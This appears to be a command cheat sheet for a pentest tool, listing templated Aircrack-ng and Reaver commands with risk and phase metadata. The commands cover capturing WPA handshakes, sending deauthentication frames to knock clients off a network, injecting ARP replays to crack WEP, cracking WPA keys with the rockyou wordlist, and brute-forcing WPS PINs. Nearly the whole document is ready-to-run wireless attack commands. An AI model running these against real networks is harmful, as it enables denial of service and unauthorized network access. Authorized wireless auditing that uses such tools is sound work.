# Aircrack-ng / Reaver

> Wireless network auditing suite for WEP/WPA cracking and WPS brute-forcing

<!-- tags: wireless, wifi, aircrack, wpa, wep, reaver -->

---

## enable monitor mode
Put the wireless interface into monitor mode for packet capture.

```bash
sudo airmon-ng start {{IFACE:iface:wlan0}}
```

<!-- meta: risk=low | phase=recon | tags=monitor,setup -->

---

## scan wifi networks
Discover nearby wireless networks and connected clients.

```bash
sudo airodump-ng {{IFACE:iface:wlan0mon}}
```

<!-- meta: risk=safe | phase=recon | tags=scan,discovery -->

---

## capture wpa handshake
Target a specific AP and channel to capture a WPA 4-way handshake.

```bash
sudo airodump-ng -c {{CHANNEL:int:6}} --bssid {{BSSID:str:AA:BB:CC:DD:EE:FF}} -w {{OUTFILE:file:capture}} {{IFACE:iface:wlan0mon}}
```

<!-- meta: risk=low | phase=recon | tags=capture,handshake,wpa -->

---

## deauth attack wifi
Send deauth frames to force clients to reconnect and capture the handshake.

```bash
sudo aireplay-ng -0 {{COUNT:int:5}} -a {{BSSID:str:AA:BB:CC:DD:EE:FF}} -c {{CLIENT:str:11:22:33:44:55:66}} {{IFACE:iface:wlan0mon}}
```

<!-- meta: risk=high | phase=exploit | tags=deauth,dos -->

---

## arp replay wep
Inject ARP requests to generate traffic and speed up WEP IV collection.

```bash
sudo aireplay-ng -3 -b {{BSSID:str:AA:BB:CC:DD:EE:FF}} -h {{CLIENT:str:11:22:33:44:55:66}} {{IFACE:iface:wlan0mon}}
```

<!-- meta: risk=high | phase=exploit | tags=arp-replay,wep -->

---

## crack wpa handshake
Crack a captured WPA handshake using a wordlist.

```bash
aircrack-ng {{CAPFILE:file:capture-01.cap}} -w {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -b {{BSSID:str:AA:BB:CC:DD:EE:FF}}
```

<!-- meta: risk=safe | phase=passwords | tags=crack,wpa -->

---

## crack wep key
Crack a WEP key from a capture file with enough IVs collected.

```bash
aircrack-ng {{CAPFILE:file:capture-01.cap}} -b {{BSSID:str:AA:BB:CC:DD:EE:FF}}
```

<!-- meta: risk=safe | phase=passwords | tags=crack,wep -->

---

## disable monitor mode
Restore the wireless interface to managed mode when finished.

```bash
sudo airmon-ng stop {{IFACE:iface:wlan0mon}}
```

<!-- meta: risk=safe | phase=misc | tags=cleanup,managed -->

---

## brute wps pin reaver
Brute-force the WPS PIN to recover the WPA passphrase.

```bash
sudo reaver -i {{IFACE:iface:wlan0mon}} -b {{BSSID:str:AA:BB:CC:DD:EE:FF}} -c {{CHANNEL:int:6}} -vv -K 1
```

<!-- meta: risk=high | phase=passwords | tags=reaver,wps,bruteforce -->
